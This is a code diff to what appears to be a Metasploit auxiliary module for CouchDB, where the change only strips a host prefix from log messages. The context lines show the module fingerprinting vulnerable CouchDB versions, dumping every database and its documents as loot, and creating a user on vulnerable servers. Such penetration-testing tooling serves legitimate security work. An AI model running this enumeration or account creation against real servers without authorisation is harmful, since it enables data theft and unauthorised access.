@@ -62,35 +62,35 @@ class MetasploitModule < Msf::Auxiliary
         'method' => 'GET'
       )
     rescue Rex::ConnectionError
-      vprint_bad("#{peer} - Connection failed")
+      vprint_bad("Connection failed")
       return false
     end
 
     unless res
-      vprint_bad("#{peer} - No response, check if it is CouchDB.")
+      vprint_bad("No response, check if it is CouchDB.")
       return false
     end
 
     if res.code == 401
-      print_bad("#{peer} - Authentication required.")
+      print_bad("Authentication required.")
       return false
     end
 
     unless res.code == 200
-      vprint_bad("#{peer} - Unexpected HTTP status #{res.code}, does not appear to be CouchDB.")
+      vprint_bad("Unexpected HTTP status #{res.code}, does not appear to be CouchDB.")
       return false
     end
 
     res_json = res.get_json_document
 
     unless res_json.is_a?(Hash) && res_json.key?('couchdb')
-      vprint_bad("#{peer} - Response does not appear to be from CouchDB.")
+      vprint_bad("Response does not appear to be from CouchDB.")
       return false
     end
 
     @version = res_json['version']
     unless @version
-      vprint_warning("#{peer} - CouchDB detected but version not found in response.")
+      vprint_warning("CouchDB detected but version not found in response.")
       return false
     end
 
@@ -103,7 +103,7 @@ class MetasploitModule < Msf::Auxiliary
     version = Rex::Version.new(@version)
     return Exploit::CheckCode::Unknown('CouchDB version string is empty') if version.version.empty?
 
-    vprint_good("#{peer} - Found CouchDB version #{version}")
+    vprint_good("Found CouchDB version #{version}")
 
     return Exploit::CheckCode::Appears("CouchDB version #{version} is in the vulnerable range") if version < Rex::Version.new('1.7.0') || version.between?(Rex::Version.new('2.0.0'), Rex::Version.new('2.1.0'))
 
@@ -119,18 +119,18 @@ class MetasploitModule < Msf::Auxiliary
 
       temp = JSON.parse(res.body)
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, JSON::ParserError => e
-      print_error("#{peer} - The following error was encountered: #{e.class}")
+      print_error("The following error was encountered: #{e.class}")
       return
     end
 
     unless valid_response(res)
-      print_error("#{peer} - Unable to enum, received \"#{res.code}\"")
+      print_error("Unable to enum, received \"#{res.code}\"")
       return
     end
 
-    print_status("#{peer} - Enumerating Databases...")
+    print_status("Enumerating Databases...")
     results = JSON.pretty_generate(temp)
-    print_good("#{peer} - Databases:\n\n#{results}\n")
+    print_good("Databases:\n\n#{results}\n")
     path = store_loot(
       'couchdb.enum',
       'application/json',
@@ -139,7 +139,7 @@ class MetasploitModule < Msf::Auxiliary
       'CouchDB Databases'
     )
 
-    print_good("#{peer} - File saved in: #{path}")
+    print_good("File saved in: #{path}")
     res.get_json_document.each do |db|
       r = send_request_cgi(
         'uri' => normalize_uri(target_uri.path, "/#{db}/_all_docs"),
@@ -149,7 +149,7 @@ class MetasploitModule < Msf::Auxiliary
       )
 
       if r.code != 200
-        print_bad("#{peer} - Error retrieving database. Consider providing credentials or setting CREATEUSER and rerunning.")
+        print_bad("Error retrieving database. Consider providing credentials or setting CREATEUSER and rerunning.")
         break
       end
 
@@ -162,7 +162,7 @@ class MetasploitModule < Msf::Auxiliary
         results,
         'CouchDB Databases'
       )
-      print_good("#{peer} - #{db} saved in: #{path}")
+      print_good("#{db} saved in: #{path}")
     end
   end
 
@@ -175,13 +175,13 @@ class MetasploitModule < Msf::Auxiliary
     temp = JSON.parse(res.body)
 
     unless valid_response(res)
-      print_error("#{peer} - Unable to enum, received \"#{res.code}\"")
+      print_error("Unable to enum, received \"#{res.code}\"")
       return
     end
 
     # Example response: {"couchdb":"Welcome","uuid":"6f08e89795bd845efc6c2bf3d57799e5","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}
 
-    print_good("#{peer} - #{JSON.pretty_generate(temp)}")
+    print_good("#{JSON.pretty_generate(temp)}")
     report_service(
       host: rhost,
       port: rport,
@@ -190,7 +190,7 @@ class MetasploitModule < Msf::Auxiliary
       info: res.body
     )
   rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, JSON::ParserError => e
-    print_error("#{peer} - The following error was encountered: #{e.class}")
+    print_error("The following error was encountered: #{e.class}")
   end
 
   def create_user
@@ -216,11 +216,11 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     unless res && res.code == 200
-      print_error("#{peer} - Change Failed")
+      print_error("Change Failed")
       return
     end
 
-    print_good("#{peer} - User #{username} created with password #{password}. Connect to #{full_uri('/_utils/')} to login.")
+    print_good("User #{username} created with password #{password}. Connect to #{full_uri('/_utils/')} to login.")
   end
 
   def run
@@ -230,7 +230,7 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['CREATEUSER']
       fail_with(Failure::Unknown, 'get_version failed in run') unless get_version
       version = Rex::Version.new(@version)
-      print_good("#{peer} - Found CouchDB version #{version}")
+      print_good("Found CouchDB version #{version}")
       create_user if version < Rex::Version.new('1.7.0') || version.between?(Rex::Version.new('2.0.0'), Rex::Version.new('2.1.0'))
     end
 
